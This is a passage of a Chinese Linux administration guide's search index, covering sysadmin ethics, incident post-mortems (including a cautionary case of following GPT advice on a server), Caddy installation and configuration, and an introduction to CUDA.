\u200b\u4e2d\u200b\u7684\u200b\u4f55\u8005\u200b\uff0c\u200b\u6070\u5f53\u200b\u7684\u200b\u5de5\u4f5c\u200b\u6001\u5ea6\u200b\u4e5f\u200b\u540c\u6837\u200b\u662f\u200b\u5fc5\u8981\u200b\u7684\u200b\u3002\u200b\u4f60\u200b\u9700\u8981\u200b\u5bf9\u200b\u4f60\u200b\u7ba1\u7406\u200b\u7684\u200b\u7cfb\u7edf\u200b/\u200b\u670d\u52a1\u200b\u8d1f\u200b\u5fc5\u8981\u200b\u7684\u200b\u8d23\u4efb\u200b\uff0c\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>\u200b\u4fdd\u8bc1\u200b\u76f8\u5e94\u200b\u7684\u200b\u7cfb\u7edf\u200b/\u200b\u670d\u52a1\u200b\u5c3d\u53ef\u80fd\u200b\u5904\u5728\u200b\u5b89\u5168\u53ef\u9760\u200b\u7684\u200b\u72b6\u6001\u200b</li> <li>\u200b\u4e0d\u80fd\u200b\u56e0\u4e3a\u200b\u4e2a\u4eba\u200b\u539f\u56e0\u200b\u84c4\u610f\u200b\u7834\u574f\u200b\u7528\u6237\u200b\u6570\u636e\u200b</li> <li>\u200b\u5c0a\u91cd\u200b\u7528\u6237\u200b\u7684\u200b\u9690\u79c1\u200b\uff0c\u200b\u4e0d\u200b\u80fd\u591f\u200b\u5229\u7528\u200b\u7528\u6237\u200b\u7684\u200b\u6570\u636e\u200b\u83b7\u53d6\u200b\u4e0d\u5f53\u200b\u5229\u76ca\u200b</li> <li>\u200b\u4e0e\u200b\u7528\u6237\u200b\u4ee5\u53ca\u200b\u5176\u4ed6\u200b\u7ba1\u7406\u200b\u6210\u5458\u200b\u4fdd\u6301\u200b\u6c9f\u901a\u200b\u4e0e\u200b\u5408\u4f5c\u200b</li> </ul> <p>\u200b\u56e0\u6b64\u200b\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u4efd\u200b\u80fd\u529b\u200b\u3001\u200b\u9053\u5fb7\u200b\u7d20\u517b\u200b\u4e0e\u200b\u8d23\u4efb\u5fc3\u200b\u7f3a\u4e00\u4e0d\u53ef\u200b\u7684\u200b\u4efb\u52a1\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u5728\u200b\u5c06\u200b\u7cfb\u7edf\u200b\u7684\u200b\u91cd\u8981\u200b\u6743\u9650\u200b\u6388\u4e88\u200b\u5176\u4ed6\u200b\u7528\u6237\u200b\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u8bf7\u200b\u786e\u4fdd\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7528\u6237\u200b\u4e86\u89e3\u200b\u76f8\u5173\u200b\u7684\u200b\u6ce8\u610f\u4e8b\u9879\u200b\uff0c\u200b\u5e76\u200b\u80fd\u591f\u200b\u4e3a\u200b\u81ea\u5df1\u200b\u7684\u200b\u884c\u4e3a\u200b\u8d1f\u8d23\u200b\u3002\u200b\u7279\u522b\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u76ee\u524d\u200b\u5927\u200b\u8bed\u8a00\u200b\u6a21\u578b\u200b\u65e0\u6cd5\u200b\u4ee3\u66ff\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u7ecf\u9a8c\u200b\u7684\u200b\u7528\u6237\u200b\u8fdb\u884c\u200b\u7cfb\u7edf\u7ba1\u7406\u200b\uff08\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4e0b\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u770b\u5230\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u7531\u4e8e\u200b\u5ffd\u7565\u200b\u8b66\u544a\u200b\u3001\u200b\u76f2\u76ee\u200b\u542c\u4ece\u200b\u5efa\u8bae\u200b\u7b49\u200b\u539f\u56e0\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u66f4\u200b\u4e25\u91cd\u200b\u7684\u200b\u540e\u679c\u200b\u3002</p> <p>sudo \u200b\u7684\u200b\u9996\u6b21\u200b\u63d0\u793a\u200b\u8bed\u200b</p> <p>\u200b\u5f53\u200b\u4f5c\u4e3a\u200b\u666e\u901a\u7528\u6237\u200b\u7b2c\u4e00\u6b21\u200b\u4f7f\u7528\u200b <code>sudo</code> \u200b\u547d\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u4f60\u200b\u4f1a\u200b\u770b\u5230\u200b\u4e0b\u9762\u200b\u8fd9\u6bb5\u8bdd\u200b\uff1a</p> <pre><code>We trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n</code></pre> <p>\u200b\u8fd9\u200b\u4e09\u70b9\u200b\uff08\u200b\u9690\u79c1\u200b\u3001\u200b\u8c28\u614e\u200b\u3001\u200b\u8d23\u4efb\u200b\uff09\u200b\u6982\u62ec\u200b\u4e86\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u5fc5\u8981\u200b\u539f\u5219\u200b\u3002</p> <p>USENIX \u200b\u7684\u200b System Administrators' Code of Ethics\uff08\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u4f26\u7406\u200b\u5b88\u5219\u200b\uff09\u200b\u5bf9\u200b\u8fd9\u4e9b\u200b\u5fc5\u8981\u200b\u7684\u200b\u539f\u5219\u200b\u6709\u7740\u200b\u66f4\u200b\u6df1\u5165\u200b\u7684\u200b\u63cf\u8ff0\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b\u7ef4\u62a4\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u662f\u200b\u4e0d\u53ef\u907f\u514d\u200b\u7684\u200b\u3002\u200b\u4f46\u662f\u200b\u5728\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5e94\u5f53\u200b\u907f\u514d\u200b\u8d23\u5907\u200b\u67d0\u4e2a\u200b\u5177\u4f53\u200b\u7684\u200b\u4eba\u200b\u3002\u200b\u6b63\u5982\u200b\u7edd\u5927\u90e8\u5206\u200b\u7684\u200b\u98de\u673a\u200b\u4e8b\u6545\u200b\u90fd\u200b\u662f\u200b\u5404\u4e2a\u65b9\u9762\u200b\u7684\u200b\u95ee\u9898\u200b\u5171\u540c\u200b\u5bfc\u81f4\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b\u67d0\u200b\u4e00\u4e2a\u200b\u4eba\u200b\u9700\u8981\u200b\u627f\u62c5\u200b\u5168\u90e8\u200b\u8d23\u4efb\u200b\u7684\u200b\u7ed3\u679c\u200b\u4e00\u6837\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5408\u683c\u200b\u7684\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\uff0c\u200b\u9700\u8981\u200b\u80fd\u591f\u200b\u7cfb\u7edf\u5730\u200b\u5206\u6790\u200b\u6545\u969c\u200b\u539f\u56e0\u200b\uff08\u200b\u8fd9\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b Post-Mortem\uff0c\u200b\u5373\u200b\u300c\u200b\u4e8b\u6545\u200b\u590d\u76d8\u200b\u300d\u200b\u6216\u200b\u300c\u200b\u4e8b\u540e\u200b\u5206\u6790\u200b\u300d\uff09\uff0c\u200b\u5e76\u4e14\u200b\u9488\u5bf9\u200b\u5206\u6790\u200b\u5f97\u5230\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6216\u200b\u7f16\u5199\u200b\u5de5\u5177\u200b\uff0c\u200b\u6216\u200b\u6539\u8fdb\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u8fd9\u6837\u200b\u624d\u200b\u80fd\u591f\u200b\u6709\u6548\u200b\u5730\u200b\u9632\u6b62\u200b\u540c\u6837\u200b\u7684\u200b\u95ee\u9898\u200b\u518d\u6b21\u53d1\u751f\u200b\u3002</p> <p>\u200b\u4e8b\u6545\u200b\u590d\u76d8\u200b</p> <p>\u200b\u4e00\u4efd\u200b\u7b80\u5355\u200b\u7684\u200b\u4e8b\u6545\u200b\u590d\u76d8\u200b\u5305\u62ec\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\uff1a</p> <ul> <li>\u200b\u4e8b\u4ef6\u200b\u63cf\u8ff0\u200b\u4e0e\u200b\u53d1\u5c55\u200b\u65f6\u95f4\u200b\u7ebf\u200b\uff1a\u200b\u5728\u200b\u4ec0\u4e48\u200b\u65f6\u5019\u200b\u53d1\u751f\u200b\u4e86\u200b\u4ec0\u4e48\u200b\uff1f\u200b\u5f71\u54cd\u200b\u5230\u200b\u4e86\u200b\u8c01\u200b\uff1f\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u4ec0\u4e48\u200b\u7ed3\u679c\u200b\uff1f\u200b\u5f53\u65f6\u200b\u662f\u200b\u600e\u4e48\u200b\u5904\u7406\u200b\u7684\u200b\uff1f</li> <li>\u200b\u539f\u56e0\u200b\u5206\u6790\u200b\uff1a\u200b\u53d1\u751f\u200b\u5bf9\u5e94\u200b\u95ee\u9898\u200b\u6709\u200b\u4ec0\u4e48\u200b\u6280\u672f\u200b\u4e0a\u200b\u4e0e\u975e\u200b\u6280\u672f\u200b\u4e0a\u200b\u7684\u200b\u539f\u56e0\u200b\uff1f</li> <li>\u200b\u6539\u8fdb\u200b\u63aa\u65bd\u200b\uff1a\u200b\u5177\u4f53\u200b\u5982\u4f55\u200b\u6539\u8fdb\u200b\u9632\u6b62\u200b\u95ee\u9898\u200b\u518d\u6b21\u53d1\u751f\u200b\uff1f\u200b\u6539\u8fdb\u200b\u6b65\u9aa4\u200b\u6bcf\u200b\u4e00\u6b65\u200b\u7684\u200b\u8d1f\u8d23\u4eba\u200b\u662f\u200b\u8c01\u200b\uff1f\u200b\u6539\u8fdb\u200b\u7684\u200b\u65f6\u95f4\u8868\u200b\u662f\u200b\u4ec0\u4e48\u200b\uff1f</li> <li>\u200b\u603b\u7ed3\u200b\uff1a\u200b\u6709\u200b\u54ea\u4e9b\u5730\u65b9\u200b\u505a\u5f97\u597d\u200b\uff08\u200b\u6b63\u9762\u200b\u7ecf\u9a8c\u200b\uff09\uff1f\u200b\u6709\u200b\u54ea\u4e9b\u5730\u65b9\u200b\u505a\u200b\u5f97\u200b\u4e0d\u8db3\u200b\uff08\u200b\u6559\u8bad\u200b\uff09\uff1f</li> </ul> <p>\u200b\u8457\u540d\u200b\u4e8b\u6545\u200b\u7684\u200b\u590d\u76d8\u200b</p> <ul> <li>GitLab \u200b\u6570\u636e\u5e93\u200b\u5220\u9664\u200b\u4e8b\u6545\u200b\uff082017\uff09</li> <li>GitHub \u200b\u670d\u52a1\u200b\u964d\u7ea7\u200b\u4e8b\u6545\u200b\uff082018\uff09</li> <li>Cloudflare \u200b\u670d\u52a1\u200b\u4e2d\u65ad\u200b\u4e8b\u6545\u200b\uff082019\uff09</li> <li>Slack \u200b\u670d\u52a1\u200b\u4e2d\u65ad\u200b\u4e8b\u6545\u200b\uff082020\uff09</li> </ul> <p>\u200b\u771f\u5b9e\u200b\u6848\u4f8b\u200b</p> <p>\u200b\u8fd9\u662f\u200b\u4e00\u4ef6\u200b\u771f\u5b9e\u200b\u53d1\u751f\u200b\u7684\u200b\u3001\u200b\u5728\u200b\u67d0\u200b\u7fa4\u804a\u200b\u4e2d\u200b\u6d41\u4f20\u200b\u51fa\u6765\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a\u200b\u5b9e\u9a8c\u5ba4\u200b\u7684\u200b A \u200b\u5c06\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7528\u6237\u200b\u79c1\u94a5\u200b\u63d0\u4f9b\u200b\u7ed9\u200b\u4e86\u200b B\uff08\u200b\u7528\u6237\u200b\u6709\u200b root \u200b\u6743\u9650\u200b\uff09\uff0cB \u200b\u4e3a\u4e86\u200b\u8fd0\u884c\u200b\u6e38\u620f\u200b\u5c1d\u8bd5\u200b\u5c06\u200b Linux \u200b\u8fdc\u7a0b\u200b\u91cd\u88c5\u200b\u4e3a\u200b Windows\uff0c\u200b\u5728\u200b\u54a8\u8be2\u200b GPT \u200b\u540e\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\uff08\u200b\u804a\u5929\u8bb0\u5f55\u200b\u7684\u200b GitHub Gist \u200b\u5b58\u6863\u200b\uff09\uff0c\u200b\u7ed3\u679c\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\uff0c\u200b\u6240\u5e78\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u6ca1\u6709\u200b\u91cd\u8981\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5c1d\u8bd5\u200b\u56de\u7b54\u200b\u4ee5\u4e0b\u200b\u95ee\u9898\u200b\uff1a</p> <ol> <li>\u200b\u8be5\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u4e8b\u6545\u200b\u590d\u76d8\u200b\u5927\u6982\u200b\u4f1a\u200b\u662f\u200b\u4ec0\u4e48\u200b\u6837\u5b50\u200b\uff1f</li> <li>\u200b\u5982\u679c\u200b\u4f60\u200b\u662f\u200b A\uff0c\u200b\u4f60\u200b\u4f1a\u200b\u5982\u4f55\u200b\u5904\u7406\u200b\u8fd9\u4ef6\u200b\u4e8b\u60c5\u200b\uff1f\u200b\u5982\u4f55\u200b\u786e\u4fdd\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u4e8b\u60c5\u200b\u4e0d\u4f1a\u200b\u518d\u6b21\u53d1\u751f\u200b\uff1f</li> <li>\u200b\u5982\u679c\u200b\u4f60\u200b\u662f\u200b B\uff0c\u200b\u4ece\u200b\u8fd9\u4ef6\u200b\u4e8b\u60c5\u200b\u4e0a\u200b\u4f60\u200b\u5f97\u5230\u200b\u4e86\u200b\u54ea\u4e9b\u200b\u6559\u8bad\u200b\uff1f</li> </ol>"},{"location":"advanced/","title":"\u9ad8\u7ea7\u200b\u5185\u5bb9","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u66f4\u52a0\u200b\u7ec6\u8282\u200b\uff0c\u200b\u6216\u8005\u200b\u4e0d\u200b\u4fbf\u4e8e\u200b\u5206\u7c7b\u200b\u5230\u200b\u4ee5\u4e0a\u200b\u4e24\u200b\u90e8\u5206\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u53ef\u200b\u5728\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u9009\u62e9\u200b\u60f3\u8981\u200b\u9605\u8bfb\u200b\u7684\u200b\u5177\u4f53\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"advanced/caddy/","title":"Caddy","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@tiankaima</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>Caddy \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7528\u200b Go \u200b\u7f16\u5199\u200b\u7684\u200b HTTP/2 web \u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u5177\u6709\u200b\u81ea\u52a8\u200b HTTPS \u200b\u529f\u80fd\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u76ee\u6807\u200b\u662f\u200b\u7b80\u5355\u200b\u3001\u200b\u6613\u4e8e\u200b\u4f7f\u7528\u200b\u3002</p> <p>\u200b\u4e0e\u200b Nginx \u200b\u76f8\u6bd4\u200b\uff0cCaddy \u200b\u786e\u5b9e\u200b\u66f4\u200b\u50cf\u662f\u200b\u4e2a\u200b\u73a9\u5177\u200b\uff0c\u200b\u4f46\u662f\u200b\u66f4\u200b\u50cf\u662f\u200b\u90a3\u79cd\u200b\u81ea\u5e26\u200b\u7535\u6c60\u200b\u7684\u200b\u73a9\u5177\u200b\uff0c\u200b\u66f4\u200b\u5229\u4e8e\u200b\u4eba\u7c7b\u200b\u4f7f\u7528\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u642d\u5efa\u200b Prototype \u200b\u800c\u200b\u4e0d\u7528\u200b\u82b1\u8d39\u200b\u592a\u200b\u591a\u200b\u65f6\u95f4\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e0a\u200b\u3002</p>"},{"location":"advanced/caddy/#installation","title":"\u5b89\u88c5","text":"<p>\u200b\u4ee5\u200b Debian \u200b\u4e3a\u4f8b\u200b\uff1a</p> <pre><code>sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl\ncurl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg\ncurl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list\nsudo apt update\nsudo apt install caddy\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u4ee5\u4e0a\u200b\u65b9\u6cd5\u200b\u5b89\u88c5\u200b\u7684\u200b Caddy \u200b\u4f1a\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b systemd \u200b\u670d\u52a1\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>systemctl</code> \u200b\u6765\u200b\u7ba1\u7406\u200b\uff1a</p> <pre><code>sudo systemctl start caddy\nsudo systemctl stop caddy\nsudo systemctl restart caddy\n</code></pre> <p>\u200b\u9ed8\u8ba4\u200b\u7684\u200b <code>Caddyfile</code> \u200b\u7684\u200b\u76ee\u5f55\u200b\u5728\u200b <code>/etc/caddy/Caddyfile</code>\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4fee\u6539\u200b <code>Caddyfile</code> \u200b\u6765\u200b\u914d\u7f6e\u200b Caddy \u200b\u7684\u200b\u884c\u4e3a\u200b\u3002\u200b\u4fee\u6539\u200b Caddyfile \u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>sudo systemctl reload caddy</code> \u200b\u8ba9\u200b Caddy \u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u200b\uff0c\u200b\u800c\u65e0\u987b\u200b\u91cd\u542f\u200b\u670d\u52a1\u200b\u3002</p> <p>Validate</p> <p>\u200b\u5728\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u68c0\u67e5\u200b Caddyfile \u200b\u683c\u5f0f\u200b\uff08\u200b\u7c7b\u4f3c\u200b <code>nginx -t</code>\uff09\uff1a</p> <pre><code>caddy validate --config /etc/caddy/Caddyfile\n</code></pre>"},{"location":"advanced/caddy/#common-configuration","title":"\u5e38\u7528\u200b\u914d\u7f6e","text":"<p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b Caddyfile \u200b\u914d\u7f6e\u200b\u793a\u4f8b\u200b\uff1a</p>"},{"location":"advanced/caddy/#static-file-server","title":"\u9759\u6001\u200b\u6587\u4ef6\u200b\u670d\u52a1\u5668","text":"<pre><code>example.com {\n    root /var/www\n    gzip\n    log /var/log/access.log\n    errors /var/log/error.log\n}\n</code></pre>"},{"location":"advanced/caddy/#reverse-proxy","title":"\u53cd\u5411\u200b\u4ee3\u7406","text":"<pre><code>example.com {\n    proxy / localhost:8080\n}\n</code></pre> <p>Simple LB</p> <p>\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u914d\u7f6e\u200b\u53ef\u200b\u505a\u200b\u7b80\u5355\u200b\u7684\u200b Load Balance\uff1a</p> <pre><code>example.com {\n    proxy / localhost:8080 localhost:8081 {\n        policy round_robin\n    }\n}\n</code></pre>"},{"location":"advanced/caddy/#abort-unconfigured-domains","title":"\u963b\u6b62\u200b Caddy \u200b\u5bf9\u200b\u672a\u200b\u914d\u7f6e\u200b\u7684\u200b\u57df\u540d\u200b\u8fdb\u884c\u200b HTTPS \u200b\u8df3\u8f6c","text":"<p>Caddy \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u4f1a\u200b\u5bf9\u200b\u6240\u6709\u200b\u7684\u200b\u57df\u540d\u200b\u8fdb\u884c\u200b HTTPS \u200b\u8df3\u8f6c\u200b\uff08HTTP 308\uff09\uff0c\u200b\u5373\u4f7f\u200b\u5bf9\u5e94\u200b\u7684\u200b\u57df\u540d\u200b\u5728\u200b Caddyfile \u200b\u4e2d\u200b\u4e0d\u200b\u5b58\u5728\u200b\u3002\u200b\u4e00\u4e9b\u200b\u7279\u5b9a\u200b\u5730\u533a\u200b\u6216\u200b\u73af\u5883\u200b\u7684\u200b\u76d1\u7ba1\u200b\u8981\u6c42\u200b HTTP \u200b\u670d\u52a1\u5668\u200b\u5bf9\u200b\u672a\u5907\u6848\u200b\u767b\u8bb0\u200b\u7684\u200b\u57df\u540d\u200b\u7684\u200b\u8bf7\u6c42\u200b\u62d2\u7edd\u200b\u54cd\u5e94\u200b\uff0c\u200b\u8fd9\u65f6\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u8fd9\u79cd\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b\u914d\u7f6e\u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\uff1a</p> <pre><code>http:// {\n    abort\n}\n</code></pre> <p>\u200b\u4f7f\u5f97\u200b Caddy \u200b\u62d2\u7edd\u200b\u5728\u200b 80 \u200b\u7aef\u53e3\u200b\u5bf9\u200b\u6240\u6709\u200b\u672a\u200b\u914d\u7f6e\u200b\u7684\u200b\u57df\u540d\u200b\u63d0\u4f9b\u200b\u670d\u52a1\u200b\u3002</p>"},{"location":"advanced/cuda/","title":"CUDA \u200b\u73af\u5883\u200b\u7b80\u4ecb","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@sscscc\u3001@relic-yuexi\u3001@Jerry-Kwan</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>CUDA\uff08Compute Unified Device Architecture\uff09\u200b\u662f\u200b\u7531\u200b NVIDIA \u200b\u516c\u53f8\u200b\u63a8\u51fa\u200b\u7684\u200b\u5f00\u53d1\u200b\u5957\u4ef6\u200b\uff0c\u200b\u5b83\u200b\u5141\u8bb8\u200b\u8f6f\u4ef6\u200b\u5f00\u53d1\u4eba\u5458\u200b\u4f7f\u7528\u200b NVIDIA \u200b\u7684\u200b GPU\uff08\u200b\u56fe\u5f62\u200b\u5904\u7406\u5355\u5143\u200b\uff09\u200b\u8fdb\u884c\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u5229\u7528\u200b GPU \u200b\u5f3a\u5927\u200b\u7684\u200b\u5e76\u884c\u5904\u7406\u200b\u80fd\u529b\u200b\u6765\u200b\u52a0\u901f\u200b\u8ba1\u7b97\u200b\u5bc6\u96c6\u578b\u200b\u4efb\u52a1\u200b\uff0c\u200b\u5e38\u7528\u200b\u4e8e\u200b\u79d1\u5b66\u8ba1\u7b97\u200b\u3001\u200b\u5de5\u7a0b\u200b\u6a21\u62df\u200b\u3001\u200b\u673a\u5668\u200b\u5b66\u4e60\u200b\u7b49\u200b\u9886\u57df\u200b\u3002</p> <p>\u200b\u5305\u542b\u200b\u7684\u200b\u7ec4\u4ef6\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li> <p>CUDA \u200b\u9a71\u52a8\u200b\u548c\u200b\u8fd0\u884c\u200b\u65f6\u200b\uff1aCUDA \u200b\u9a71\u52a8\u200b\u4e0e\u200b\u5185\u6838\u200b\u5c42\u200b\u9a71\u52a8\u200b\u5171\u540c\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u4e0e\u200b GPU \u200b\u4ea4\u4e92\u200b\uff1b\u200b\u8fd0\u884c\u200b\u65f6\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u66f4\u200b\u9ad8\u7ea7\u200b\u522b\u7684\u200b API\uff0c\u200b\u4f7f\u200b\u5f00\u53d1\u8005\u200b\u80fd\u591f\u200b\u66f4\u200b\u65b9\u4fbf\u200b\u5730\u200b\u4f7f\u7528\u200b GPU\u3002</p> </li> <li> <p>CUDA \u200b\u7f16\u8bd1\u5668\u200b\uff08nvcc\uff09\uff1a\u200b\u5c06\u200b CUDA \u200b\u4ee3\u7801\u200b\u8f6c\u6362\u6210\u200b\u53ef\u4ee5\u200b\u5728\u200b NVIDIA GPU \u200b\u4e0a\u200b\u8fd0\u884c\u200b\u7684\u200b\u4e8c\u8fdb\u5236\u200b\u4ee3\u7801\u200b\u7684\u200b\u7f16\u8bd1\u5668\u200b\u3002</p> </li> <li> <p>CUDA \u200b\u5e93\u200b\uff1a\u200b\u4f18\u5316\u200b\u8fc7\u200b\u7684\u200b\u6570\u5b66\u200b\u4e0e\u200b\u79d1\u5b66\u8ba1\u7b97\u200b\u5e93\u200b\uff0c\u200b\u6bd4\u5982\u200b\u7ebf\u6027\u4ee3\u6570\u200b\u8fd0\u7b97\u200b\uff08cuBLAS\uff09\u3001\u200b\u5085\u91cc\u53f6\u200b\u53d8\u6362\u200b\uff08cuFFT\uff09\u200b\u7b49\u200b\u3002</p> </li> <li> <p>CUDA \u200b\u5de5\u5177\u200b\uff1a\u200b\u6bd4\u5982\u200b\u6027\u80fd\u200b\u5206\u6790\u5668\u200b\uff08NVIDIA Nsight \u200b\u548c\u200b Visual Profiler\uff09\u200b\u548c\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\uff0c\u200b\u5b83\u4eec\u200b\u5e2e\u52a9\u200b\u5f00\u53d1\u8005\u200b\u4f18\u5316\u200b\u548c\u200b\u8c03\u8bd5\u200b CUDA \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u3002</p> </li> </ul>"},{"location":"advanced/cuda/#what-is-cuda","title":"\u4f60\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b CUDA \u200b\u5417\u200b\uff1f","text":"<p>\u200b\u5f53\u200b\u6211\u4eec\u200b\u8bf4\u200b\u5230\u200b\u300c\u200b\u914d\u7f6e\u200b CUDA \u200b\u73af\u5883\u200b\u300d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u4e24\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a</p> <ol> <li>\u200b\u5b89\u88c5\u200b NVIDIA \u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u9a71\u52a8\u200b\u4ee5\u53ca\u200b\u90e8\u5206\u200b\u7528\u6237\u200b\u6001\u200b\u7ec4\u4ef6\u200b\uff08\u200b\u9a71\u52a8\u200b\uff09\uff0c\u200b\u4f7f\u5f97\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u80fd\u591f\u200b\u6b63\u786e\u200b\u8bc6\u522b\u200b\u663e\u5361\u200b\u5e76\u200b\u4e0e\u200b\u4e4b\u200b\u901a\u4fe1\u200b\u3002</li> <li>\u200b\u5b89\u88c5\u200b CUDA \u200b\u8fd0\u884c\u200b\u65f6\u200b\u548c\u200b\u5f00\u53d1\u5de5\u5177\u200b\uff08\u200b\u7528\u6237\u200b\u6001\u200b\uff09\uff0c\u200b\u4f7f\u5f97\u200b\u6211\u4eec\u200b\u80fd\u591f\u200b\u5728\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u4f7f\u7528\u200b CUDA API\u3002</li> </ol> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u53ea\u662f\u200b\u60f3\u8981\u200b\u8fd0\u884c\u200b CUDA \u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u6709\u4e9b\u200b\u7a0b\u5e8f\u200b\u53ef\u80fd\u200b\u81ea\u5e26\u200b\u4e86\u200b CUDA \u200b\u8fd0\u884c\u200b\u65f6\u200b\u3002\u200b\u8fd9\u65f6\u200b\u53ea\u200b\u9700\u8981\u200b\u786e\u4fdd\u200b\u6709\u200b NVIDIA \u200b\u9a71\u52a8\u200b\u3002\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u8fc7\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u4e0d\u200b\u9700\u8981\u200b\u4efb\u4f55\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u8981\u200b\u8fd0\u884c\u200b\u4f9d\u8d56\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e2d\u200b\u73b0\u6709\u200b\u7684\u200b CUDA \u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u6216\u8005\u200b\u4f60\u200b\u60f3\u8981\u200b\u4f7f\u7528\u200b CUDA \u200b\u7684\u200b\u5e93\u200b\u5f00\u53d1\u200b\u81ea\u5df1\u200b\u7684\u200b CUDA 